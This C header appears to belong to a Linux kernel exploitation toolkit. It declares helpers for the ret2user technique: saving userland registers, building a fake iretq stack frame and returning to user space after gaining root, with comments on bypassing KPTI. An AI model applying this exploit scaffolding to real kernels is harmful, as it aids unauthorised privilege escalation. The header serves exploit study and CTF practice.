#ifndef RET2USER_H
#define RET2USER_H

#include <stdint.h>  

/* ============= 1 =============
 * Return to userland with
 *      iretq
 *
 *      Namely: swapgs ... iretq
 *
 * Before executing the iretq instruction,
 *      we need to prepare a user state context
 *      over to 5 registers:
 *
 *  +-------------------------+
 *  | RIP (return address)    | <- top of stack (RSP)
 *  +-------------------------+
 *  | CS  (code segment)      |
 *  +-------------------------+
 *  | RFLAGS                  |
 *  +-------------------------+
 *  | RSP (stack pointer)     |
 *  +-------------------------+
 *  | SS  (stack segment)     |
 *  +-------------------------+
 *
 * PATCH: 
 *      A direct ret2user can’t be used since Linux 4.15
 *      All userspace memory in kernel will be mapped as non-executable (KPTI)
 *      We will need to bypass KPTI then continue this attack
 * */

/* Userland context for iretq */
typedef struct iretq_user_ctx {
    uintptr_t ss;
    uintptr_t rsp;
    uintptr_t rflags;
    uintptr_t cs;
    uintptr_t rip;  // Top of stack frame
} iretq_user_ctx_t;

/* Global user context for iretq */
extern iretq_user_ctx_t IRETQ_USER_CTX;

/* Save userland state for iretq transition */
iretq_user_ctx_t save_iretq_user_ctx(void (*rip_func)(void));


/* Prepare a stack frame to store
 *      the required values beforre returning to user space
 *      in order
 *
 * The values on this stack frame
 *      will be pushed onto the corresponding registers:
 *      RIP, CS, RFLAGS, RSP, SS
 *      for iretq to use
 * */
extern __attribute__((aligned(16))) uintptr_t IRETQ_FRAME[5];

/* Populate iretq user context into fake stack frame */
void stash_iretq_frame(uintptr_t frame[5], iretq_user_ctx_t ctx);


/* After privesc (getuid=0) as root,
 *      iretq to user space.
 * swapgs
 * push user_ss
 * push user_rsp
 * push user_rflags
 * push user_cs
 * push user_rip
 * iretq
 *      
 * But we prefer using a trick to fake a stackframe,
 *      and pass its address to rsp directly,
 *      to avoid register clobbers in the asm
 * */

/* Pass an iretq user ctx struct as an variable for the inline asm payload */
void __attribute__((noreturn)) __ret2user_iretq(iretq_user_ctx_t ctx);

/* use a global stackframe */
void __attribute__((noreturn)) _glb_ret2user_iretq(void); 

/* Wrapper */
void __attribute__((noreturn)) ret2user_iretq(void);


/* Helper: Dump iretq user context like a virtual stack layout */
void dump_iretq_user_ctx(iretq_user_ctx_t *ctx);


#endif  // RET2USER_H

